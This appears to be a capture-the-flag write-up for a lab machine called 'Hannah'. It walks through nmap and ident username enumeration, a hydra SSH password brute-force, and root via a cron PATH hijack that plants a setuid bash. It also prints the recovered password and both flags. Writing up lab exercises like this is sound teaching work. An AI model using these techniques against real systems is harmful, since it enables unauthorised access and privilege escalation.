# Hannah

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.186:22
Open 10.0.2.186:80
Open 10.0.2.186:113
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.186
PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsj7MOj3Vm8JanPr7G5uuu4JkAKxMl/JUY4Ho8eU8WZcWqfs03ZgMHHmdZIS8tUokccuQde274Q51PYRZS6IVQlfm5ajIKa09kLwnBzG7re+WcC3CtMf7dyebGuPLTazA3ZVqTa55pnDAdgMngVTMrlDuEeXOABr95zdWzVv0kYss70KS5VUPtTPYtxzaRjBst81jYWl5DFgB3p/svcGpAYUn6IbWcRrUUFEn45VLcyQWhmRx3RPXZFOg1z8QsQYCXzb6i72KO4yUSlVNFee7cJymqm10cYJroc0Z7m5v/NH4oHrhotEN891Aqm+5JT9BW+Tvrt8UeXFE3Mgkthhw2Zw4vlQ9LjfkcIf0iJMSIfRC4y3uGjX5pOwEfXLMWWo3MdPvrMpqpQ8pvAF5bX1nqlYgEzOoyWhg/SIaC/xdUR8L2wRh0GDj5ZuYcDOVeqtW8HwKvojL8d2J/vLhkzCyGQGP0xQM6NmlaEXGCw6lmLDr0o62yMh+YVd2S3AXikG8=
|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEhCj+IZ/i9sF9RvGDQyghehC5IpNDXl1ExSGnc4Ue00fxxU9NIimVMtcLZsHLal1t5/N0Kn3M3IdPS4b5sWBCk=
|   256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOZpXiYl4Ds359UO3oPBLjkxXxHEUhtL8VRLSguYFDmC
80/tcp  open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/enlightenment
|_http-title: Site doesn't have a title (text/html).
|_auth-owners: moksha
|_http-server-header: nginx/1.18.0
113/tcp open  ident?  syn-ack
|_auth-owners: root
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

```bash
└─$ curl http://10.0.2.186
Under construction
```

```bash
└─$ feroxbuster -u http://10.0.2.186/ --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET        1l        2w       19c http://10.0.2.186/
200      GET        1l        2w       19c http://10.0.2.186/index.html
200      GET        1l        2w       25c http://10.0.2.186/robots.txt
```

```bash
└─$ curl http://10.0.2.186/enlightenment -is | head -1
HTTP/1.1 404 Not Found
```

Nothing?

## Ident

- [https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/113-pentesting-ident?q=113](https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/113-pentesting-ident?q=113)
- [**Ident-user-enum**](https://github.com/pentestmonkey/ident-user-enum) is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system. The list of usernames gathered can be used for password guessing attacks on other network services.

I couldn't understand perl code so translated it to Python, it's just basic `nc` connection with correct parameters leaking information.
```python
import socket
import argparse

def ident_lookup(ip, port, timeout=5):
    try:
        # 1. Establish connection to the target service port
        with socket.create_connection((ip, port), timeout=timeout) as io:
            source_port = io.getsockname()[1]

            # 2. Connect to the Ident daemon (Port 113)
            with socket.create_connection((ip, 113), timeout=timeout) as io:
                query = f"{port}, {source_port}\r\n"
                io.sendall(query.encode())

                # 3. Receive and parse response
                response = io.recv(1024).decode().strip()
                
                # Response format: "80, 54321 : USERID : UNIX : www-data"
                if "USERID" in response:
                    return response.split(":")[-1].strip()
                return None
    except (socket.timeout, ConnectionRefusedError):
        return None
    except Exception as e:
        return f"Error: {str(e)}"

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Target IP address or hostname")
    parser.add_argument("ports", type=int, nargs="+", help="One or more TCP ports to query")
    parser.add_argument("-t", "--timeout", type=float, default=5.0, help="Timeout in seconds (default: 5.0)")

    args = parser.parse_args()
    print(f"Target: {args.ip}\n")

    for port in args.ports:
        username = ident_lookup(args.ip, port, args.timeout)
        print(f"{args.ip}:{port}\t{username}")

if __name__ == "__main__":
    main()
```

Enumerate ports
```bash
└─$ ident-user-enum 10.0.2.186 $(seq 1 10000) | grep -v unknown
10.0.2.186:22	root
10.0.2.186:80	moksha
10.0.2.186:113	root
```

## SSH

```bash
└─$ hydra -l moksha -P $rockyou 10.0.2.186 ssh -I
[22][ssh] host: 10.0.2.186   login: moksha   password: hannah
```

```bash
└─$ sshpass -p 'hannah' ssh moksha@10.0.2.186
moksha@hannah:~$ id
uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### User.txt

```bash
moksha@hannah:~$ cat user.txt
HMVGGHFWP2023
```

## Privilege Escalation

```bash
moksha@hannah:~$ cat /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin
* * * * * root touch /tmp/enlIghtenment
```

```bash
moksha@hannah:~$ ls -l /tmp/enlIghtenment
-rw-r--r-- 1 root root 0 ene 12 19:52 /tmp/enlIghtenment
moksha@hannah:~$ cat /tmp/enlIghtenment
```

```bash
# Not writeable
moksha@hannah:~$ ls -alhd /usr/bin/
drwxr-xr-x 2 root root 20K ene  4  2023 /usr/bin/

# Not writeable
moksha@hannah:~$ ls -alhd /usr/local/bin/
drwxr-xr-x 2 root root 4,0K ene  4  2023 /usr/local/bin/

# Writeable
moksha@hannah:~$ ls -alhd /media/
drwxrwxrwx 3 root root 4,0K ene  4  2023 /media/
moksha@hannah:~$ echo x > /media/x
moksha@hannah:~$ rm /media/x
```

In crontab `PATH` variable `/media` comes before `/usr/bin`
```bash
moksha@hannah:~$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > /media/touch
moksha@hannah:~$ chmod +x /media/touch
```

```bash
moksha@hannah:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### Root.txt

```bash
rootbash-5.1# cat /root/root.txt
HMVHAPPYNY2023
```